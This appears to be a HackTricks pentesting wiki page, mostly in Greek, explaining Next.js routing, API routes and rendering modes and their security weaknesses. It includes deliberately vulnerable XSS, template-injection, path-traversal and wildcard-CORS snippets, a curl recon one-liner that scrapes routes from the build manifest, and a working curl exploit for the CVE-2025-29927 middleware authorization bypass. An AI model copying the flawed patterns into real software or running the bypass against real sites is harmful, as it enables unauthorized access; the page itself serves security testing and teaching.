# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Γενική Αρχιτεκτονική μιας Εφαρμογής Next.js

### Τυπική Δομή Αρχείων

Ένα τυπικό project Next.js ακολουθεί μια συγκεκριμένη δομή αρχείων και φακέλων που διευκολύνει λειτουργίες όπως δρομολόγηση, API endpoints και διαχείριση στατικών πόρων. Ακολουθεί μια τυπική διάταξη:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Κύριοι Κατάλογοι και Αρχεία

- **public/:** Φιλοξενεί στατικά αρχεία όπως εικόνες, γραμματοσειρές και άλλα αρχεία. Τα αρχεία εδώ είναι προσβάσιμα στη ριζική διαδρομή (`/`).
- **app/:** Κεντρικός κατάλογος για τις σελίδες, layouts, components, και API routes της εφαρμογής σας. Υιοθετεί το πρότυπο **App Router**, επιτρέποντας προηγμένες δυνατότητες δρομολόγησης και τον διαχωρισμό components μεταξύ server και client.
- **app/layout.tsx:** Ορίζει το root layout για την εφαρμογή σας, τυλίγοντας όλες τις σελίδες και παρέχοντας συνεπή στοιχεία UI όπως headers, footers και navigation bars.
- **app/page.tsx:** Λειτουργεί ως σημείο εισόδου για τη ριζική route (`/`), αποδίδοντας την αρχική σελίδα.
- **app/[route]/page.tsx:** Xειρίζεται static και dynamic routes. Κάθε φάκελος μέσα στο `app/` αντιπροσωπεύει ένα segment της διαδρομής, και το `page.tsx` μέσα σε αυτούς τους φακέλους αντιστοιχεί στο component της διαδρομής.
- **app/api/:** Περιέχει API routes, επιτρέποντάς σας να δημιουργήσετε serverless functions που χειρίζονται HTTP requests. Αυτές οι διαδρομές αντικαθιστούν τον παραδοσιακό κατάλογο `pages/api`.
- **app/components/:** Φιλοξενεί επαναχρησιμοποιήσιμα React components που μπορούν να χρησιμοποιηθούν σε διάφορες σελίδες και layouts.
- **app/styles/:** Περιέχει global CSS files και CSS Modules για styling σε επίπεδο component.
- **app/utils/:** Περιλαμβάνει utility functions, helper modules και άλλη μη-UI λογική που μπορεί να κοινοποιηθεί στην εφαρμογή.
- **.env.local:** Αποθηκεύει environment variables ειδικά για το τοπικό development περιβάλλον. Αυτές οι μεταβλητές **δεν** δεσμεύονται στο version control.
- **next.config.js:** Προσαρμόζει τη συμπεριφορά του Next.js, συμπεριλαμβανομένων ρυθμίσεων webpack, μεταβλητών περιβάλλοντος και ρυθμίσεων ασφάλειας.
- **tsconfig.json:** Ρυθμίζει τις παραμέτρους TypeScript για το έργο, ενεργοποιώντας τον έλεγχο τύπων και άλλες δυνατότητες TypeScript.
- **package.json:** Διαχειρίζεται τις εξαρτήσεις του έργου, scripts και μεταδεδομένα.
- **README.md:** Παρέχει τεκμηρίωση και πληροφορίες για το έργο, συμπεριλαμβανομένων οδηγιών εγκατάστασης, οδηγιών χρήσης και άλλων σχετικών λεπτομερειών.
- **yarn.lock / package-lock.json:** Κλειδώνουν τις εξαρτήσεις του έργου σε συγκεκριμένες εκδόσεις, εξασφαλίζοντας συνεπείς εγκαταστάσεις σε διαφορετικά περιβάλλοντα.

## Client-Side in Next.js

### File-Based Routing in the `app` Directory

Ο κατάλογος `app` είναι το θεμέλιο της δρομολόγησης στις νεότερες εκδόσεις του Next.js. Χρησιμοποιεί το filesystem για να ορίσει διαδρομές, κάνοντας τη διαχείριση διαδρομών διαισθητική και κλιμακώσιμη.

<details>

<summary>Χειρισμός της ριζικής διαδρομής /</summary>

**Δομή Αρχείων:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Κύρια Αρχεία:**

- **`app/page.tsx`**: Χειρίζεται τα αιτήματα στη ριζική διαδρομή `/`.
- **`app/layout.tsx`**: Ορίζει το layout της εφαρμογής και περιβάλλει όλες τις σελίδες.

**Υλοποίηση:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Επεξήγηση:**

- **Ορισμός διαδρομής:** Το αρχείο `page.tsx` που βρίσκεται απευθείας στον κατάλογο `app` αντιστοιχεί στη διαδρομή `/`.
- **Απόδοση:** Αυτό το component αποδίδει το περιεχόμενο της αρχικής σελίδας.
- **Ενσωμάτωση Layout:** Το component `HomePage` περιβάλλεται από το `layout.tsx`, το οποίο μπορεί να περιλαμβάνει επικεφαλίδες, υποσέλιδα και άλλα κοινά στοιχεία.

</details>

<details>

<summary>Διαχείριση άλλων στατικών διαδρομών</summary>

**Παράδειγμα: Διαδρομή `/about`**

**Δομή αρχείων:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Υλοποίηση:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Εξήγηση:**

- **Ορισμός διαδρομής:** Το `page.tsx` αρχείο μέσα στον φάκελο `about` αντιστοιχεί στη διαδρομή `/about`.
- **Απόδοση:** Αυτό το component εμφανίζει το περιεχόμενο για τη σελίδα about.

</details>

<details>

<summary>Δυναμικές Διαδρομές</summary>

Οι δυναμικές διαδρομές επιτρέπουν τη διαχείριση διαδρομών με μεταβλητά τμήματα, δίνοντας τη δυνατότητα στις εφαρμογές να εμφανίζουν περιεχόμενο βάσει παραμέτρων όπως IDs, slugs, κ.λπ.

**Παράδειγμα: `/posts/[id]` Διαδρομή**

**Δομή αρχείων:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Υλοποίηση:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Εξήγηση:**

- **Δυναμικό Τμήμα:** `[id]` δηλώνει ένα δυναμικό τμήμα στη διαδρομή, συλλαμβάνοντας την παράμετρο `id` από το URL.
- **Πρόσβαση σε Παραμέτρους:** Το αντικείμενο `params` περιέχει τις δυναμικές παραμέτρους, προσβάσιμες μέσα στο component.
- **Ταύτιση Διαδρομής:** Οποιαδήποτε διαδρομή που ταιριάζει με `/posts/*`, όπως `/posts/1`, `/posts/abc`, κ.λπ., θα χειρίζεται αυτό το component.

</details>

<details>

<summary>Φωλιασμένες διαδρομές</summary>

Το Next.js υποστηρίζει nested routing, επιτρέποντας ιεραρχικές δομές διαδρομών που αντικατοπτρίζουν τη διάταξη των φακέλων.

**Παράδειγμα: `/dashboard/settings/profile` Διαδρομή**

**Δομή Αρχείων:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Υλοποίηση:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Επεξήγηση:**

- **Βαθιά εμφώλευση:** Το αρχείο `page.tsx` μέσα στο `dashboard/settings/profile/` αντιστοιχεί στη διαδρομή `/dashboard/settings/profile`.
- **Αντανάκλαση ιεραρχίας:** Η δομή των φακέλων αντικατοπτρίζει τη διαδρομή URL, βελτιώνοντας τη συντηρησιμότητα και την ευκρίνεια.

</details>

<details>

<summary>Διαδρομές Catch-All</summary>

Οι διαδρομές Catch-All χειρίζονται πολλαπλά εμφωλευμένα τμήματα ή άγνωστες διαδρομές, παρέχοντας ευελιξία στον χειρισμό διαδρομών.

**Παράδειγμα: `/*` Διαδρομή**

**Δομή αρχείων:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Υλοποίηση:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Επεξήγηση:**

- **Τμήμα Catch-All:** `[...slug]` συλλαμβάνει όλα τα εναπομείναντα τμήματα της διαδρομής ως πίνακα.
- **Χρήση:** Χρήσιμο για τη διαχείριση δυναμικών σεναρίων δρομολόγησης, όπως διαδρομές που δημιουργούνται από χρήστες, εμφωλευμένες κατηγορίες, κ.λπ.
- **Ταίριασμα Διαδρομών:** Διαδρομές όπως `/anything/here`, `/foo/bar/baz`, κ.λπ., χειρίζονται από αυτό το component.

</details>

### Πιθανές ευπάθειες client-side

Παρότι το Next.js παρέχει ένα ασφαλές θεμέλιο, λανθασμένες πρακτικές κωδικοποίησης μπορούν να εισαγάγουν ευπάθειες. Οι κύριες ευπάθειες στην client-side περιλαμβάνουν:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

Οι επιθέσεις XSS συμβαίνουν όταν κακόβουλα σενάρια εισάγονται σε αξιόπιστους ιστότοπους. Οι επιτιθέμενοι μπορούν να εκτελέσουν σενάρια στα προγράμματα περιήγησης των χρηστών, να κλέψουν δεδομένα ή να εκτελέσουν ενέργειες εξ ονόματος του χρήστη.

**Παράδειγμα ευάλωτου κώδικα:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Γιατί είναι ευάλωτο:** Η χρήση του `dangerouslySetInnerHTML` με μη αξιόπιστη είσοδο επιτρέπει σε attackers να εισάγουν malicious scripts.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Συμβαίνει όταν οι εισροές χρήστη χειρίζονται ακατάλληλα σε πρότυπα, επιτρέποντας σε attackers να εισάγουν και να εκτελέσουν πρότυπα ή εκφράσεις.

**Παράδειγμα ευάλωτου κώδικα:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Γιατί Είναι Ευάλωτο:** Αν τα `template` ή `data` περιέχουν κακόβουλο περιεχόμενο, αυτό μπορεί να οδηγήσει σε εκτέλεση μη επιθυμητού κώδικα.

</details>

<details>

<summary>Client Path Traversal</summary>

Είναι μια ευπάθεια που επιτρέπει σε επιτιθέμενους να χειραγωγήσουν client-side διαδρομές για να εκτελέσουν μη επιθυμητές ενέργειες, όπως Cross-Site Request Forgery (CSRF). Σε αντίθεση με το server-side path traversal, που στοχεύει στο filesystem του server, το CSPT επικεντρώνεται στην εκμετάλλευση μηχανισμών στην πλευρά του client για να αναδρομολογήσει νόμιμα API αιτήματα σε κακόβουλα endpoints.

**Παράδειγμα Ευπαθούς Κώδικα:**

Μια Next.js εφαρμογή επιτρέπει στους χρήστες να ανεβάζουν και να κατεβάζουν αρχεία. Η λειτουργία λήψης είναι υλοποιημένη στην πλευρά του client, όπου οι χρήστες μπορούν να καθορίσουν τη διαδρομή αρχείου για λήψη.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Σενάριο Επίθεσης

1. **Στόχος του Επιτιθέμενου**: Εκτέλεση CSRF επίθεσης για τη διαγραφή ενός κρίσιμου αρχείου (π.χ. `admin/config.json`) με χειραγώγηση του `filePath`.
2. **Εκμετάλλευση CSPT**:
- **Κακόβουλη Είσοδος**: Ο επιτιθέμενος δημιουργεί ένα URL με χειραγωγημένο `filePath` όπως `../deleteFile/config.json`.
- **Προκύπτουσα Κλήση API**: Το client-side code κάνει μία αίτηση στο `/api/files/../deleteFile/config.json`.
- **Διαχείριση από τον server**: Αν ο server δεν επικυρώνει το `filePath`, επεξεργάζεται το αίτημα, ενδεχομένως διαγράφοντας ή αποκαλύπτοντας ευαίσθητα αρχεία.
3. **Εκτέλεση CSRF**:
- **Κατασκευασμένος Σύνδεσμος**: Ο επιτιθέμενος στέλνει στο θύμα έναν σύνδεσμο ή ενσωματώνει ένα κακόβουλο script που ενεργοποιεί το αίτημα λήψης με το χειραγωγημένο `filePath`.
- **Αποτέλεσμα**: Το θύμα εκτελεί άθελά του την ενέργεια, οδηγώντας σε μη εξουσιοδοτημένη πρόσβαση ή διαγραφή αρχείων.

#### Γιατί είναι ευάλωτο

- **Έλλειψη Επικύρωσης Εισόδου**: Το client-side επιτρέπει αυθαίρετες εισόδους `filePath`, επιτρέποντας path traversal.
- **Εμπιστοσύνη στις Εισόδους από τον Client**: Το server-side API εμπιστεύεται και επεξεργάζεται το `filePath` χωρίς sanitization.
- **Πιθανές Δράσεις API**: Αν το API endpoint εκτελεί ενέργειες που αλλάζουν κατάσταση (π.χ. delete, modify files), μπορεί να εκμεταλλευτεί μέσω CSPT.

</details>

### Recon: ανακάλυψη routes σε static export μέσω _buildManifest

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- Grab the buildId from the root response (often printed at the bottom) or from `<script>` tags loading `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Χρησιμοποιήστε τις ανακαλυφθείσες διαδρομές (για παράδειγμα `/docs`, `/docs/content/examples`, `/signin`) για να καθοδηγήσετε το auth testing και την endpoint discovery.

## Server-Side στο Next.js

### Απόδοση στην πλευρά διακομιστή (SSR)

Οι σελίδες αποδίδονται στον διακομιστή σε κάθε αίτημα, εξασφαλίζοντας ότι ο χρήστης λαμβάνει πλήρως αποδομένο HTML. Σε αυτή την περίπτωση πρέπει να δημιουργήσετε το δικό σας custom server για να επεξεργάζεται τα αιτήματα.

**Περιπτώσεις χρήσης:**

- Δυναμικό περιεχόμενο που αλλάζει συχνά.
- Βελτιστοποίηση SEO, καθώς οι μηχανές αναζήτησης μπορούν να ανιχνεύσουν την πλήρως αποδομένη σελίδα.

**Υλοποίηση:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Στατική δημιουργία ιστότοπου (SSG)

Οι σελίδες προ-αποδίδονται κατά το χρόνο build, με αποτέλεσμα ταχύτερους χρόνους φόρτωσης και μειωμένο φόρτο στον διακομιστή.

**Περιπτώσεις χρήσης:**

- Περιεχόμενο που δεν αλλάζει συχνά.
- Ιστολόγια, τεκμηρίωση, σελίδες μάρκετινγκ.

**Υλοποίηση:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Συναρτήσεις Serverless (API Routes)

Next.js επιτρέπει τη δημιουργία API endpoints ως συναρτήσεις serverless. Αυτές οι συναρτήσεις εκτελούνται κατά ζήτηση χωρίς την ανάγκη αφιερωμένου server.

**Περιπτώσεις χρήσης:**

- Επεξεργασία υποβολών φορμών.
- Αλληλεπίδραση με βάσεις δεδομένων.
- Επεξεργασία δεδομένων ή ενσωμάτωση με APIs τρίτων.

**Υλοποίηση:**

Με την εισαγωγή του `app` directory στο Next.js 13, το routing και η διαχείριση API έγιναν πιο ευέλικτα και ισχυρά. Αυτή η σύγχρονη προσέγγιση ευθυγραμμίζεται στενά με το σύστημα δρομολόγησης βάσει αρχείων αλλά εισάγει βελτιωμένες δυνατότητες, συμπεριλαμβανομένης της υποστήριξης για server και client components.

#### Βασικός Route Handler

**Δομή Αρχείων:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Υλοποίηση:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Εξήγηση:**

- **Τοποθεσία:** Οι διαδρομές API τοποθετούνται στον φάκελο `app/api/`.
- **Ονομασία αρχείων:** Κάθε API endpoint βρίσκεται στον δικό του φάκελο που περιέχει ένα αρχείο `route.js` ή `route.ts`.
- **Εξαγόμενες Συναρτήσεις:** Αντί για μία προεπιλεγμένη εξαγωγή, εξάγονται συγκεκριμένες συναρτήσεις για κάθε HTTP μέθοδο (π.χ. `GET`, `POST`).
- **Χειρισμός Απαντήσεων:** Χρησιμοποιήστε τον constructor `Response` για να επιστρέφετε απαντήσεις, επιτρέποντας μεγαλύτερο έλεγχο στα headers και τους status codes.

#### Πώς να χειριστείτε άλλες διαδρομές και μεθόδους:

<details>

<summary>Χειρισμός συγκεκριμένων HTTP μεθόδων</summary>

Next.js 13+ σάς επιτρέπει να ορίζετε χειριστές για συγκεκριμένες HTTP μεθόδους μέσα στο ίδιο αρχείο `route.js` ή `route.ts`, προάγοντας πιο σαφή και οργανωμένο κώδικα.

**Παράδειγμα:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Επεξήγηση:**

- **Πολλαπλές Εξαγωγές:** Κάθε HTTP μέθοδος (`GET`, `PUT`, `DELETE`) έχει τη δική της εξαγόμενη συνάρτηση.
- **Παράμετροι:** Το δεύτερο όρισμα παρέχει πρόσβαση στις παραμέτρους της διαδρομής μέσω του `params`.
- **Βελτιωμένες Απαντήσεις:** Μεγαλύτερος έλεγχος στα αντικείμενα απόκρισης, επιτρέποντας ακριβή διαχείριση επικεφαλίδων και κωδικών κατάστασης.

</details>

<details>

<summary>Catch-All και εμφωλευμένες διαδρομές</summary>

Next.js 13+ υποστηρίζει προχωρημένα χαρακτηριστικά δρομολόγησης όπως catch-all διαδρομές και εμφωλευμένες API διαδρομές, επιτρέποντας πιο δυναμικές και κλιμακούμενες δομές API.

**Παράδειγμα Catch-All Route:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Επεξήγηση:**

- **Syntax:** `[...]` δηλώνει ένα catch-all τμήμα, που συλλαμβάνει όλες τις εμφωλευμένες διαδρομές.
- **Usage:** Χρήσιμο για APIs που πρέπει να χειριστούν διαδρομές με μεταβλητό βάθος ή δυναμικά τμήματα.

**Παράδειγμα εμφωλευμένων διαδρομών:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Εξήγηση:**

- **Deep Nesting:** Επιτρέπει ιεραρχικές δομές API, που αντικατοπτρίζουν τις σχέσεις μεταξύ πόρων.
- **Parameter Access:** Εύκολη πρόσβαση σε πολλαπλές παραμέτρους διαδρομής μέσω του αντικειμένου `params`.

</details>

<details>

<summary>Διαχείριση API routes στο Next.js 12 και παλαιότερες εκδόσεις</summary>

## Διαδρομές API στον κατάλογο `pages` (Next.js 12 και παλαιότερες εκδόσεις)

Before Next.js 13 introduced the `app` directory and enhanced routing capabilities, API routes were primarily defined within the `pages` directory. Αυτή η προσέγγιση εξακολουθεί να χρησιμοποιείται ευρέως και υποστηρίζεται σε Next.js 12 και παλαιότερες εκδόσεις.

#### Βασική διαδρομή API

**File Structure:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Υλοποίηση:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Επεξήγηση:**

- **Θέση:** Οι API routes βρίσκονται μέσα στον κατάλογο `pages/api/`.
- **Export:** Χρησιμοποιήστε `export default` για να ορίσετε τη συνάρτηση handler.
- **Υπογραφή Συνάρτησης:** Ο handler λαμβάνει τα αντικείμενα `req` (HTTP αίτημα) και `res` (HTTP απόκριση).
- **Δρομολόγηση:** Το όνομα αρχείου (`hello.js`) αντιστοιχεί στο endpoint `/api/hello`.

#### Δυναμικές API routes

**Δομή αρχείου:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Υλοποίηση:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Επεξήγηση:**

- **Δυναμικά Τμήματα:** Οι αγκύλες τετραγώνου (`[id].js`) υποδηλώνουν δυναμικά τμήματα διαδρομής.
- **Πρόσβαση σε Παραμέτρους:** Χρησιμοποιήστε `req.query.id` για πρόσβαση στη δυναμική παράμετρο.
- **Διαχείριση Μεθόδων:** Χρησιμοποιήστε λογική με συνθήκες για να χειριστείτε διαφορετικές HTTP μεθόδους (`GET`, `PUT`, `DELETE`, κ.λπ.).

#### Διαχείριση Διαφορετικών HTTP Μεθόδων

Ενώ το βασικό παράδειγμα API route χειρίζεται όλες τις HTTP μεθόδους μέσα σε μία συνάρτηση, μπορείτε να δομήσετε τον κώδικά σας ώστε να χειρίζεται κάθε μέθοδο ρητά για καλύτερη σαφήνεια και συντηρησιμότητα.

**Παράδειγμα:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Βέλτιστες Πρακτικές:**

- **Διαχωρισμός Ευθυνών:** Διαχώρισε ρητά τη λογική για διαφορετικές μεθόδους HTTP.
- **Συνέπεια Απαντήσεων:** Εξασφαλίστε συνεπή δομή απαντήσεων για ευκολότερο χειρισμό από την πλευρά του client.
- **Διαχείριση Σφαλμάτων:** Χειριστείτε ομαλά τις μη υποστηριζόμενες μεθόδους και τα απρόσμενα σφάλματα.

</details>

### Διαμόρφωση CORS

Ελέγξτε ποιες προελεύσεις μπορούν να έχουν πρόσβαση στις API routes σας, μετριάζοντας ευπάθειες Cross-Origin Resource Sharing (CORS).

**Κακό Παράδειγμα Διαμόρφωσης:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Σημειώστε ότι **το CORS μπορεί επίσης να ρυθμιστεί σε όλες τις API routes** μέσα στο αρχείο **`middleware.ts`**:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Πρόβλημα:**

- **`Access-Control-Allow-Origin: '*'`:** Επιτρέπει σε οποιονδήποτε ιστότοπο να έχει πρόσβαση στο API, ενδεχομένως επιτρέποντας σε κακόβουλους ιστότοπους να αλληλεπιδρούν με το API σας χωρίς περιορισμούς.
- **Wide Method Allowance:** Η επιτρεπόμενη χρήση όλων των μεθόδων μπορεί να επιτρέψει σε επιτιθέμενους να εκτελέσουν ανεπιθύμητες ενέργειες.

**Πώς το εκμεταλλεύονται οι επιτιθέμενοι:**

Οι επιτιθέμενοι μπορούν να δημιουργήσουν κακόβουλους ιστότοπους που στέλνουν αιτήματα στο API σας, ενδεχομένως καταχρώμενοι λειτουργίες όπως ανάκτηση δεδομένων, τροποποίηση δεδομένων ή ενεργοποίηση ανεπιθύμητων ενεργειών εκ μέρους αυθεντικοποιημένων χρηστών.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Έκθεση κώδικα διακομιστή στην πλευρά πελάτη

Μπορεί να είναι εύκολο να **χρησιμοποιείται κώδικας που προορίζεται για τον διακομιστή και να εμφανίζεται επίσης σε κώδικα που εκτίθεται και χρησιμοποιείται στην πλευρά πελάτη**, ο καλύτερος τρόπος για να διασφαλίσετε ότι ένα αρχείο κώδικα δεν θα εκτεθεί ποτέ στην πλευρά πελάτη είναι να χρησιμοποιήσετε αυτό το import στην αρχή του αρχείου:
```js
import "server-only"
```
## Κύρια Αρχεία και ο Ρόλος τους

### `middleware.ts` / `middleware.js`

**Τοποθεσία:** Στη ρίζα του έργου ή μέσα στο `src/`.

**Σκοπός:** Εκτελεί κώδικα στη server-side serverless λειτουργία πριν επεξεργαστεί ένα αίτημα, επιτρέποντας ενέργειες όπως επαλήθευση ταυτότητας, ανακατευθύνσεις ή τροποποίηση απαντήσεων.

**Ροή Εκτέλεσης:**

1. **Εισερχόμενο αίτημα:** Το middleware αναχαιτίζει το αίτημα.
2. **Επεξεργασία:** Εκτελεί ενέργειες βάσει του αιτήματος (π.χ., έλεγχος επαλήθευσης ταυτότητας).
3. **Τροποποίηση απάντησης:** Μπορεί να αλλάξει την απάντηση ή να παραδώσει τον έλεγχο στον επόμενο χειριστή.

**Παραδείγματα Χρήσης:**

- Ανακατεύθυνση μη αυθεντικοποιημένων χρηστών.
- Προσθήκη προσαρμοσμένων κεφαλίδων.
- Καταγραφή αιτημάτων.

**Δείγμα Ρύθμισης:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

Εάν το authorization επιβάλλεται στο middleware, οι επηρεασμένες εκδόσεις του Next.js (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) μπορούν να παρακαμφθούν με την έγχυση της κεφαλίδας `x-middleware-subrequest`. Το framework θα παραλείψει την αναδρομή του middleware και θα επιστρέψει την προστατευμένη σελίδα.

- Η βασική συμπεριφορά είναι συνήθως μια ανακατεύθυνση 307 σε ένα route σύνδεσης όπως `/api/auth/signin`.
- Στείλτε μια μεγάλη τιμή στο `x-middleware-subrequest` (επανάλαβε το `middleware` για να φτάσεις το `MAX_RECURSION_DEPTH`) για να αλλάξετε την απόκριση σε 200:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
